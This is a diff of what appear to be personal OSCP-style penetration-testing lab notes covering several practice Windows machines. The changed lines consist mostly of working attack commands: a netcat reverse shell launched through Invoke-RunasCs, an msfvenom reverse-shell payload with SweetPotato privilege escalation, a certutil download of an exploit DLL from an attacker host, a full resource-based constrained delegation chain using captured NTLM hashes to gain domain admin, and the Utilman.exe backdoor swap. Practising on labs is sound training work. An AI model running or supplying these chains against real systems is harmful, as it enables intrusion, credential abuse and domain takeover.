@@ -242,7 +242,7 @@ Session completed.
 
 7. Use of Invoke-RunasCs for reverse shell. It will allow runas command at a line with user and password together. Obtained local.txt
 ```
-PS C:\xampp\htdocs\uploads> Invoke-RunasCs svc_mssql trustno1 'c:/xampp/htdocs/uploads/nc64.exe 192.168.45.198 4545 -e cmd.exe'
+PS C:\xampp\htdocs\uploads> Invoke-RunasCs svc_mssql trustno1 'C:/xampp/htdocs/uploads/nc.exe 192.168.45.202 1234 -e cmd.exe'
 
 ┌──(kali㉿kali)-[~/OSCP/htb]
 └─$ nc -nvlp 4545                   
@@ -763,6 +763,8 @@ Videos commands
 4. cadaver $ip (presence of webdav)
 5. upload cmd.apsx, get reverse shell
 6. use seimpersonate  as priv esc. 
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.202 LPORT=4433 -f exe -o r.exe 
+.\SweetPotato.exe -e EfsRpc -p r.exe
 ```
 
 ## Internal
@@ -995,7 +997,7 @@ C:\Program Files (x86)>set PATH=%SystemRoot%\system32;%SystemRoot%;
 
 5. Upload msfvenom dll file and also exploit. 
 ```
-certutil -urlcache -f http://192.168.45.153/exploit.dll C:/Windows/Temp/UninOldIS.dll
+certutil -urlcache -f http://192.168.45.202/exploit.dll C:/Windows/Temp/UninOldIS.dll
 
 https://www.exploit-db.com/exploits/49382
 ```
@@ -1221,6 +1223,32 @@ WINRM       192.168.187.175 5985   192.168.187.175  [+] resourced.local\L.Living
 5. Obtained local.txt from winrm. 
 ```
 evil-winrm  -i 192.168.187.175 -u L.Livingstone -H '19a3a7550ce8c505c2d46b5e39d6f808'
+```
+
+6. Remaining (User livingstone have genericall permission on domain controller)
+```
+impacket-addcomputer resourced.local/l.livingstone -dc-ip 192.168.120.181 -hashes :19a3a7550ce8c505c2d46b5e39d6f808 -computer-name 'ATTACK$' -computer-pass 'AttackerPC1!'
+
+
+*Evil-WinRM* PS C:\Users\L.Livingstone\Documents> get-adcomputer attack
+
+
+sudo python3 rbcd.py -dc-ip 192.168.120.181 -t RESOURCEDC -f 'ATTACK' -hashes :19a3a7550ce8c505c2d46b5e39d6f808 resourced\\l.livingstone    
+
+
+*Evil-WinRM* PS C:\Users\L.Livingstone\Documents> Get-adcomputer resourcedc -properties msds-allowedtoactonbehalfofotheridentity |select -expand msds-allowedtoactonbehalfofotheridentity
+
+
+impacket-getST -spn cifs/resourcedc.resourced.local resourced/attack\$:'AttackerPC1!' -impersonate Administrator -dc-ip 192.168.120.181
+
+
+export KRB5CCNAME=./Administrator.ccache
+
+
+sudo sh -c 'echo "192.168.120.181 resourcedc.resourced.local" >> /etc/hosts'
+
+
+sudo impacket-psexec -k -no-pass resourcedc.resourced.local -dc-ip 192.168.120.181 
 ```
 
 ## Squid
@@ -1461,4 +1489,10 @@ python3 /usr/share/doc/python3-impacket/examples/psexec.py vault.offsec/anirudh:
 
 C:\Windows\system32> whoami
 nt authority\system
+```
+
+8. Another priv. 
+```
+ren Utilman.exe Utilman.old
+ren cmd.exe Utilman.exe
 ```
